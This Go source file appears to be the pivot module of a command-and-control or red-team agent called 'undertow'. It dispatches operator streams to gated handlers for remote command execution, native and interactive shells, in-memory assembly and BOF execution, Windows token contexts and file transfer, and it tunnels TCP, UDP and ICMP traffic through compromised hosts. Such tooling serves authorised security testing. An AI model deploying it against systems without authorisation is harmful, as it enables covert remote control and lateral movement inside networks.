package pivot

import (
	"context"
	"errors"
	"io"
	"log"
	"net"
	"net/netip"
	"runtime"
	"strings"

	"undertow/internal/icmp"
	"undertow/internal/mux"
)

// ServeAgent handles stream opens with ordinary TCP sockets. It never listens
// on the agent or changes its host routes or adapters.
func ServeAgent(ctx context.Context, m *mux.Mux) {
	ServeAgentWithCapabilities(ctx, m, DefaultCapabilities())
}

// ServeAgentWithExec remains for internal callers that used the former
// combined execution/file-transfer switch.
func ServeAgentWithExec(ctx context.Context, m *mux.Mux, allowExec bool) {
	caps := DefaultCapabilities()
	caps.Exec, caps.HostOps, caps.Upload, caps.Download = allowExec, allowExec, allowExec, allowExec
	ServeAgentWithCapabilities(ctx, m, caps)
}

func ServeAgentWithCapabilities(ctx context.Context, m *mux.Mux, caps Capabilities) {
	ServeAgentWithLifecycle(ctx, m, caps, nil)
}

// ServeAgentWithLifecycle adds the configured-agent shutdown control stream.
// A nil stop callback keeps manually launched agents on their existing path.
func ServeAgentWithLifecycle(ctx context.Context, m *mux.Mux, caps Capabilities, stop func()) {
	ctx = context.WithValue(ctx, tokenCapabilityKey{}, caps.TokenContexts)
	for {
		s, err := m.Accept(ctx)
		if err != nil {
			return
		}
		if s.Destination() == ShutdownDestination {
			if stop == nil {
				s.Fail(errors.New("remote shutdown requires a configured agent"))
				continue
			}
			go func() {
				defer s.Close()
				if s.AcceptOpen(ctx) != nil {
					return
				}
				if _, err := s.Write([]byte{1}); err != nil {
					return
				}
				var confirmation [1]byte
				if n, err := s.Read(confirmation[:]); n == 1 && err == nil && confirmation[0] == 1 {
					if _, err := s.Write([]byte{2}); err != nil {
						return
					}
					if err := s.CloseWrite(); err != nil {
						return
					}
					var end [1]byte
					if _, err := s.Read(end[:]); err == io.EOF {
						stop()
					}
				}
			}()
			continue
		}
		if s.Destination() == TokenDestination {
			if !caps.TokenContexts || runtime.GOOS != "windows" {
				s.Fail(errors.New("agent authentication contexts are disabled"))
				continue
			}
			go serveTokens(ctx, s)
			continue
		}
		if s.Destination() == ExecDestination {
			if !caps.Exec {
				s.Fail(errors.New("agent command execution is disabled"))
				continue
			}
			go serveExec(ctx, s, false)
			continue
		}
		if s.Destination() == HostOpsDestination {
			if !caps.HostOps {
				s.Fail(errors.New("agent host operations are disabled"))
				continue
			}
			go serveExec(ctx, s, true)
			continue
		}
		if s.Destination() == InteractiveDestination {
			if !caps.Interactive {
				s.Fail(errors.New("agent interactive sessions are disabled"))
				continue
			}
			go serveInteractive(ctx, s, caps)
			continue
		}
		if s.Destination() == ScriptDestination {
			if !caps.Scripts {
				s.Fail(errors.New("agent scripts are disabled"))
				continue
			}
			go serveScript(ctx, s)
			continue
		}
		if s.Destination() == WASMDestination {
			if !caps.WASM {
				s.Fail(errors.New("agent wasm execution is disabled"))
				continue
			}
			go serveWASM(ctx, s)
			continue
		}
		if s.Destination() == NativeDestination {
			if !caps.Native {
				s.Fail(errors.New("agent native execution is disabled"))
				continue
			}
			go serveNative(ctx, s)
			continue
		}
		if s.Destination() == NativeShellDestination {
			if !caps.Native || !caps.Interactive {
				s.Fail(errors.New("agent native live shell is disabled"))
				continue
			}
			go serveNativeShell(ctx, s)
			continue
		}
		if s.Destination() == AssemblyDestination {
			if !caps.Native {
				s.Fail(errors.New("agent native execution is disabled"))
				continue
			}
			go serveAssembly(ctx, s)
			continue
		}
		if s.Destination() == BOFDestination {
			if !caps.Native {
				s.Fail(errors.New("agent native execution is disabled"))
				continue
			}
			go serveBOF(ctx, s)
			continue
		}
		if s.Destination() == FileDestination {
			if !caps.Upload && !caps.Download {
				s.Fail(errors.New("agent file transfer is disabled"))
				continue
			}
			go serveFile(ctx, s, caps)
			continue
		}
		if s.Destination() == ListenerDestination {
			if !caps.Listeners {
				s.Fail(errors.New("agent listeners are disabled"))
				continue
			}
			go ServeAgentListener(ctx, m, s)
			continue
		}
		if s.Destination() == RelayListenerDestination {
			if !caps.Relay {
				s.Fail(errors.New("agent relay capability is disabled"))
				continue
			}
			go ServeAgentRelayListener(ctx, m, s)
			continue
		}
		if !caps.Pivot {
			s.Fail(errors.New("agent pivot is disabled"))
			continue
		}
		go serveSocket(ctx, s)
	}
}

func serveSocket(ctx context.Context, s *mux.Stream) {
	if strings.HasPrefix(s.Destination(), "icmp://") {
		host, _, err := net.SplitHostPort(strings.TrimPrefix(s.Destination(), "icmp://"))
		if err != nil {
			s.Fail(err)
			return
		}
		ip, err := netip.ParseAddr(host)
		if err != nil || !ip.Is4() {
			s.Fail(errors.New("invalid ICMP target"))
			return
		}
		if err = s.AcceptOpen(ctx); err != nil {
			s.Close()
			return
		}
		defer s.Close()
		payload, err := io.ReadAll(io.LimitReader(s, 1401))
		status := byte(1)
		if err == nil && len(payload) > 0 && len(payload) <= 1400 {
			if _, err = icmp.Echo(ctx, ip, payload); err == nil {
				status = 0
			}
		}
		if err != nil {
			log.Printf("ICMP echo %s failed: %v", ip, err)
		}
		_, _ = s.Write([]byte{status})
		_ = s.CloseWrite()
		return
	}
	var dialer net.Dialer
	network := "tcp"
	destination := s.Destination()
	if strings.HasPrefix(destination, "udp://") {
		network = "udp"
		destination = strings.TrimPrefix(destination, "udp://")
	}
	conn, err := dialer.DialContext(ctx, network, destination)
	if err != nil {
		log.Printf("socket egress %s %s failed: %v", network, destination, err)
		s.Fail(err)
		return
	}
	if err = s.AcceptOpen(ctx); err != nil {
		conn.Close()
		s.Close()
		return
	}
	if network == "udp" {
		BridgeUDP(ctx, conn, s)
	} else {
		bridge(ctx, conn, s)
	}
}

// ServeVPN accepts outbound client flows. Explicit pivot routes may be sent
// through an agent when the client requested internal access.
const ControlDestination = "control.undertow.invalid:0"
const EventDestination = "events.undertow.invalid:0"
const ShutdownDestination = "shutdown.undertow.invalid:0"

func ServeVPN(ctx context.Context, client *mux.Mux, resolve func(netip.Addr) (*mux.Mux, bool), internal bool) {
	ServeVPNInteractive(ctx, client, resolve, func() bool { return internal }, nil)
}

func ServeVPNInteractive(ctx context.Context, client *mux.Mux, resolve func(netip.Addr) (*mux.Mux, bool), internal func() bool, control func(context.Context, *mux.Stream)) {
	for {
		s, err := client.Accept(ctx)
		if err != nil {
			return
		}
		go func(s *mux.Stream) {
			if s.Destination() == ControlDestination || s.Destination() == EventDestination || s.Destination() == FileDestination || s.Destination() == InteractiveRelayDestination {
				if control == nil {
					s.Fail(errors.New("remote operator console is disabled"))
				} else {
					control(ctx, s)
				}
				return
			}
			if s.Destination() == "health.undertow.invalid:0" {
				_ = s.AcceptOpen(ctx)
				_ = s.CloseWrite()
				return
			}
			if !internal() {
				serveSocket(ctx, s)
				return
			}
			address := strings.TrimPrefix(strings.TrimPrefix(s.Destination(), "udp://"), "icmp://")
			host, _, err := net.SplitHostPort(address)
			if err != nil {
				s.Fail(err)
				return
			}
			ip, err := netip.ParseAddr(host)
			if err != nil {
				s.Fail(err)
				return
			}
			agent, configured := resolve(ip)
			if !configured {
				serveSocket(ctx, s)
				return
			}
			if agent == nil {
				s.Fail(errors.New("pivot agent offline"))
				return
			}
			upstream, err := agent.Open(ctx, s.Destination())
			if err != nil {
				s.Fail(err)
				return
			}
			if err := s.AcceptOpen(ctx); err != nil {
				upstream.Close()
				s.Close()
				return
			}
			defer s.Close()
			defer upstream.Close()
			done := make(chan struct{}, 2)
			go func() { _, _ = io.Copy(upstream, s); _ = upstream.CloseWrite(); done <- struct{}{} }()
			go func() { _, _ = io.Copy(s, upstream); _ = s.CloseWrite(); done <- struct{}{} }()
			for i := 0; i < 2; i++ {
				select {
				case <-done:
				case <-ctx.Done():
					return
				case <-s.Done():
					return
				case <-upstream.Done():
					return
				}
			}
		}(s)
	}
}

// ServeForward exposes one operator-side TCP listener mapped to an agent stream.
// choose must select a live authenticated agent for each new flow.
func ServeForward(ctx context.Context, listener net.Listener, destination string, choose func() *mux.Mux) {
	go func() { <-ctx.Done(); listener.Close() }()
	for {
		local, err := listener.Accept()
		if err != nil {
			return
		}
		go func() {
			m := choose()
			if m == nil {
				local.Close()
				return
			}
			stream, err := m.Open(ctx, destination)
			if err != nil {
				local.Close()
				return
			}
			bridge(ctx, local, stream)
		}()
	}
}

func bridge(ctx context.Context, local net.Conn, stream *mux.Stream) {
	defer local.Close()
	defer stream.Close()
	done := make(chan struct{}, 2)
	go func() { _, _ = io.Copy(stream, local); _ = stream.CloseWrite(); done <- struct{}{} }()
	go func() {
		_, _ = io.Copy(local, stream)
		if tcp, ok := local.(*net.TCPConn); ok {
			_ = tcp.CloseWrite()
		}
		done <- struct{}{}
	}()
	for i := 0; i < 2; i++ {
		select {
		case <-done:
		case <-ctx.Done():
			local.Close()
			stream.Close()
			return
		case <-streamDone(stream):
			local.Close()
			return
		}
	}
}

// Bridge connects a proxy-side TCP endpoint, including a userland-stack
// endpoint, to one authenticated agent stream.
func Bridge(ctx context.Context, local net.Conn, stream *mux.Stream) { bridge(ctx, local, stream) }

func streamDone(s *mux.Stream) <-chan struct{} { return s.Done() }
